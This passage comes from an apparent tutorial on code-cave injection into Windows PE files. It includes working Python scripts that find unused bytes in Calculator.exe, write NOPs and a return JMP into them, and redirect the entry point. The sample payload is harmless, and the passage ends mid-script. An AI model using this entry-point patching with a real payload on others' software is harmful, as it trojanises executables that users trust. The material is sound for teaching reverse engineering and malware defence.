    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">Total caves found:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span> <span class="k">if</span> <span class="n">caves_found</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="k">else</span> <span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}{</span><span class="n">caves_found</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="n">caves_found</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">No caves found. This means:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  - The compiler optimized well (no wasted space)</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  - Or caves are smaller than minimum size</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">Try running with smaller min_size:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s"> 20</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">()</span>
    <span class="n">pe</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;filename.exe&gt; [min_size]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">Examples:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calculator.exe</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calculator.exe 100</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">python </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> Calculator.exe 300</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">min_size</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="mi">50</span>
    
    <span class="nf">find_code_caves</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">min_size</span><span class="p">)</span>
</pre></table></code></div></div><p><strong>Running the script:</strong></p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 find_caves.py Calculator.exe 300
</pre></table></code></div></div><div class="language-console nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">=== Code Cave Hunter ===
Searching in: Calculator.exe
Looking for caves with minimum 300 bytes

[*] Scanning section: .text
  ✓ Found cave!
    Location (RVA): 0x2239
    Size: 455 bytes
    File offset: 0x1639

Total caves found: 1
</span></pre></table></code></div></div><p><strong>What this means:</strong></p><p>We found a cave of 455 empty bytes at address <code class="language-plaintext highlighter-rouge">0x2239</code>. This is enough space to inject a small payload (like showing a MessageBox).</p><p><strong>Visual representation:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>.text section (executable code):
Address 0x1000: [Actual program code]
Address 0x1500: [More program code]
Address 0x2239: [000000000000...] ← 455 empty bytes (CODE CAVE!)
Address 0x2500: [Actual program code continues]
</pre></table></code></div></div><p>Perfect! We have a cave big enough for our injection. Next, we’ll learn how to write code into this space.</p><h3 id="injecting-payload"><span class="me-2">Injecting Payload</span><a href="#injecting-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="understanding-nop-no-operation"><span class="me-2">Understanding NOP (No Operation)</span><a href="#understanding-nop-no-operation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><strong>NOP</strong> is the simplest CPU instruction. It means: “Do nothing, move to next instruction.”</p><p><strong>Analogy:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>Recipe:
1. Preheat oven
2. (skip this step)        ← This is like NOP
3. (skip this step)        ← This is like NOP
4. Mix ingredients
</pre></table></code></div></div><p><strong>In machine code:</strong></p><ul><li>NOP = <code class="language-plaintext highlighter-rouge">0x90</code> (one byte)<li>When CPU sees <code class="language-plaintext highlighter-rouge">0x90</code>, it does nothing and continues</ul><p><strong>Why use NOP for testing?</strong></p><ul><li>Harmless (won’t crash the program)<li>Easy to identify (just one byte: <code class="language-plaintext highlighter-rouge">90</code>)<li>Proves injection works (we can see it in debugger)</ul><h4 id="understanding-jmp-jump"><span class="me-2">Understanding JMP (Jump)</span><a href="#understanding-jmp-jump" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><strong>JMP</strong> tells the CPU: “Stop reading here, jump to another address.”</p><p><strong>Analogy:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Recipe Book:
Page 10: Mix flour and sugar
Page 11: [JUMP TO PAGE 50]    ← JMP instruction
Page 12: (this page is skipped)
...
Page 50: Add eggs and milk     ← CPU continues here
</pre></table></code></div></div><p><strong>In machine code:</strong></p><ul><li>JMP = <code class="language-plaintext highlighter-rouge">0xE9 XX XX XX XX</code> (5 bytes total)<li>First byte <code class="language-plaintext highlighter-rouge">E9</code> = JMP opcode<li>Next 4 bytes = where to jump (offset)</ul><p><strong>Why do we need JMP?</strong></p><p>After our injected code runs, we need to jump back to the original program. Without JMP, the program would crash.</p><h4 id="the-injection-plan"><span class="me-2">The Injection Plan</span><a href="#the-injection-plan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Here’s what we’re going to do:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre># BEFORE injection:
Program starts → Entry Point (0x18C0) → Calculator code → Exit

# AFTER injection:
Program starts → Entry Point (NEW: 0x2239) → Our code (NOP + JMP) → 
                                             Jump to (0x18C0)     → Calculator code → Exit
</pre></table></code></div></div><p><strong>Step by step:</strong></p><ol><li>Write our code (5 NOPs + JMP) into the code cave at <code class="language-plaintext highlighter-rouge">0x2239</code><li>Change the Entry Point from <code class="language-plaintext highlighter-rouge">0x18C0</code> to <code class="language-plaintext highlighter-rouge">0x2239</code><li>Calculate JMP offset to jump back to <code class="language-plaintext highlighter-rouge">0x18C0</code></ol><h4 id="calculating-jmp-offset"><span class="me-2">Calculating JMP Offset</span><a href="#calculating-jmp-offset" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>This is the tricky part. JMP uses <strong>relative addressing</strong> - it doesn’t jump to an absolute address, but to an offset from current position.</p><p><strong>Formula:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Offset = Target Address - (Current Address + 5)
</pre></table></code></div></div><p><strong>Why + 5?</strong> Because the JMP instruction itself is 5 bytes long. The CPU calculates from the byte AFTER the JMP instruction.</p><p><strong>Example:</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>We are at: 0x2239 (start of code cave)
We write:  5 NOPs (5 bytes) + JMP (5 bytes) = 10 bytes total
JMP position: 0x2239 + 5 = 0x223E
We want to jump to: 0x18C0 (original entry point)

Offset = 0x18C0 - (0x223E + 5)
       = 0x18C0 - 0x2243
       = 0xFFFFF67D (negative number)
</pre></table></code></div></div><p><strong>Why negative?</strong> Because we’re jumping backwards in memory (from <code class="language-plaintext highlighter-rouge">0x2239</code> to <code class="language-plaintext highlighter-rouge">0x18C0</code>).</p><h4 id="simple-injection-script"><span class="me-2">Simple Injection Script</span><a href="#simple-injection-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Now let’s write a script to inject 5 NOPs + JMP:</p><div file="inject_simple.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="inject_simple.py"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">pefile</span>
<span class="kn">import</span> <span class="n">struct</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="c1"># ANSI Color codes
</span><span class="k">class</span> <span class="nc">Colors</span><span class="p">:</span>
    <span class="n">HEADER</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[95m</span><span class="sh">'</span>
    <span class="n">BLUE</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[94m</span><span class="sh">'</span>
    <span class="n">CYAN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[96m</span><span class="sh">'</span>
    <span class="n">GREEN</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[92m</span><span class="sh">'</span>
    <span class="n">YELLOW</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[93m</span><span class="sh">'</span>
    <span class="n">RED</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[91m</span><span class="sh">'</span>
    <span class="n">BOLD</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[1m</span><span class="sh">'</span>
    <span class="n">END</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">simple_injection</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">cave_rva</span><span class="p">,</span> <span class="n">cave_raw</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">
    Simple code injection: 5 NOPs + JMP back to original entry
    
    This is a harmless test to prove injection works.
    The program will execute our 5 NOPs then continue normally.
    </span><span class="sh">"""</span>
    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">input_file</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">=== Simple Code Injection ===</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Get original entry point
</span>    <span class="n">original_entry</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Step 1]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Original entry point: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">original_entry</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         Program currently starts here</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Step 2]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Code cave location: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         This is where we</span><span class="sh">'</span><span class="s">ll write our code</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Build shellcode: 5 NOPs
</span>    <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">5</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Step 3]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Our code: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">5 NOP instructions</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         In hex: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">HEADER</span><span class="si">}{</span><span class="n">shellcode</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         Each 90 = NOP (do nothing)</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Calculate JMP offset
</span>    <span class="n">jmp_from</span> <span class="o">=</span> <span class="n">cave_rva</span> <span class="o">+</span> <span class="mi">5</span>
    <span class="n">jmp_to</span> <span class="o">=</span> <span class="n">original_entry</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">jmp_to</span> <span class="o">-</span> <span class="p">(</span><span class="n">jmp_from</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Step 4]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Calculating JMP offset:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         JMP from: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">jmp_from</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> (after our NOPs)</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         JMP to: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">jmp_to</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> (original entry)</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         Formula: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">jmp_to</span><span class="p">)</span><span class="si">}</span><span class="s"> - (</span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">jmp_from</span><span class="p">)</span><span class="si">}</span><span class="s"> + 5)</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         Offset: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">offset</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> (</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">HEADER</span><span class="si">}{</span><span class="nf">hex</span><span class="p">(</span><span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s">)</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Add JMP instruction
</span>    <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xE9</span><span class="sh">'</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;i</span><span class="sh">'</span><span class="p">,</span> <span class="n">offset</span><span class="p">)</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Step 5]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Complete code:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">HEADER</span><span class="si">}{</span><span class="n">shellcode</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">^ 90 90 90 90 90</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> = 5 NOPs</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}</span><span class="s">^ E9 XX XX XX XX</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> = JMP with offset</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Write to file
</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Step 6]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Writing to file offset </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">CYAN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_raw</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">pe</span><span class="p">.</span><span class="nf">set_bytes_at_offset</span><span class="p">(</span><span class="n">cave_raw</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">Wrote </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Change entry point
</span>    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">[Step 7]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Changing entry point:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         Old: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">RED</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">original_entry</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         New: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">0x</span><span class="si">{</span><span class="n">cave_rva</span><span class="si">:</span><span class="n">X</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">pe</span><span class="p">.</span><span class="n">OPTIONAL_HEADER</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span> <span class="o">=</span> <span class="n">cave_rva</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">         </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">Now program starts at our code!</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Save
</span>    <span class="n">pe</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">output_file</span><span class="p">)</span>
    <span class="n">pe</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">GREEN</span><span class="si">}</span><span class="s">[Success]</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="s"> Saved as: </span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">YELLOW</span><span class="si">}{</span><span class="n">output_file</span><span class="si">}{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">BOLD</span><span class="si">}</span><span class="s">What happens when you run it:</span><span class="si">{</span><span class="n">Colors</span><span class="p">.</span><span class="n">END</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
